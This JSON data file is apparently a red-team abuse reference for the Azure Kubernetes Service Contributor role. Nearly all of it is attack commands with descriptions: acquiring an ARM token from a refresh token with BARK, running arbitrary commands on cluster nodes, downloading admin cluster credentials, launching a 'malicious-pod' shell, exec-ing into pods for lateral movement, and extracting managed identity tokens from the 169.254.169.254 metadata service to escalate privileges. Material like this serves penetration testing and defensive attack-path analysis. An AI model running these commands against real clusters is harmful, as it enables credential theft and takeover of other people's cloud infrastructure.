{
    "AZAKSContributor": {
        "meaning": "The Azure Kubernetes Service Contributor role grants full control of the target Azure Kubernetes Service Managed Cluster. This includes the ability to remotely fetch administrator credentials for the cluster as well as the ability to execute arbitrary commands on compute nodes associated with the AKS Managed Cluster.",
        "common": "",
        "windows": {
            "BARK_PowerShell": [
                {
                    "order": 1,
                    "command": "$ARMToken = Get-ARMTokenWithRefreshToken -RefreshToken \"0.ARwA6WgJJ9X2qk...\" -TenantID \"contoso.onmicrosoft.com\"",
                    "description": "Acquire Azure Resource Manager scoped JWT using refresh token via BARK"
                },
                {
                    "order": 2,
                    "command": "Invoke-AzureRMAKSRunCommand -Token $ARMToken -TargetAKSId \"/subscriptions/f1816681-4df5-4a31-acfa-922401687008/resourcegroups/AKS_ResourceGroup/providers/Microsoft.ContainerService/managedClusters/mykubernetescluster\" -Command \"whoami\"",
                    "description": "Execute arbitrary commands on AKS compute nodes using BARK"
                },
                {
                    "order": 3,
                    "command": "Invoke-AzureRMAKSRunCommand -Token $ARMToken -TargetAKSId \"/subscriptions/subscription-id/resourcegroups/rg-name/providers/Microsoft.ContainerService/managedClusters/cluster-name\" -Command \"curl -i -H \\\"Metadata: true\\\" \\\"http://169.254.169.254/metadata/identity/oauth2/token?resource=https://graph.microsoft.com/&api-version=2019-08-01\\\"\"",
                    "description": "Retrieve managed identity JWT token from AKS cluster metadata service"
                }
            ],
            "Azure_CLI_Kubectl": [
                {
                    "order": 1,
                    "command": "az login",
                    "description": "Authenticate to Azure using Azure CLI"
                },
                {
                    "order": 2,
                    "command": "az aks get-credentials --resource-group AKS_ResourceGroup --name mykubernetescluster --admin",
                    "description": "Retrieve administrator credentials for AKS cluster"
                },
                {
                    "order": 3,
                    "command": "kubectl get nodes",
                    "description": "List all compute nodes in the AKS cluster"
                },
                {
                    "order": 4,
                    "command": "kubectl run malicious-pod --image=busybox --rm -it --restart=Never -- /bin/sh",
                    "description": "Create malicious pod for command execution on cluster"
                }
            ]
        },
        "linux": {
            "Azure_CLI_Kubernetes": [
                {
                    "order": 1,
                    "command": "az login",
                    "description": "Authenticate to Azure using Azure CLI"
                },
                {
                    "order": 2,
                    "command": "az aks get-credentials --resource-group ResourceGroupName --name ClusterName --admin",
                    "description": "Download admin credentials for AKS cluster"
                },
                {
                    "order": 3,
                    "command": "kubectl get pods --all-namespaces",
                    "description": "Enumerate all pods across namespaces in the cluster"
                },
                {
                    "order": 4,
                    "command": "kubectl exec -it pod-name -n namespace -- /bin/bash",
                    "description": "Execute commands in existing pods for lateral movement"
                }
            ],
            "REST_API_Direct": [
                {
                    "order": 1,
                    "command": "curl -H \"Authorization: Bearer $ACCESS_TOKEN\" \"https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{rg}/providers/Microsoft.ContainerService/managedClusters/{cluster}/runCommand?api-version=2021-05-01\" -X POST -d '{\"command\":\"whoami\"}'",
                    "description": "Execute commands on AKS nodes via REST API"
                },
                {
                    "order": 2,
                    "command": "curl -H \"Authorization: Bearer $ACCESS_TOKEN\" \"https://management.azure.com/subscriptions/{subscription-id}/resourceGroups/{rg}/providers/Microsoft.ContainerService/managedClusters/{cluster}/listClusterUserCredential?api-version=2021-05-01\" -X POST",
                    "description": "Retrieve cluster user credentials via REST API"
                }
            ],
            "Metadata_Service_Abuse": [
                {
                    "order": 1,
                    "command": "# From within AKS pod: curl -H \"Metadata: true\" \"http://169.254.169.254/metadata/identity/oauth2/token?resource=https://graph.microsoft.com/&api-version=2019-08-01\"",
                    "description": "Extract managed identity tokens from AKS metadata service"
                },
                {
                    "order": 2,
                    "command": "# Use extracted token for further Azure resource access",
                    "description": "Leverage managed identity tokens for privilege escalation in Azure"
                }
            ]
        }
    }
}
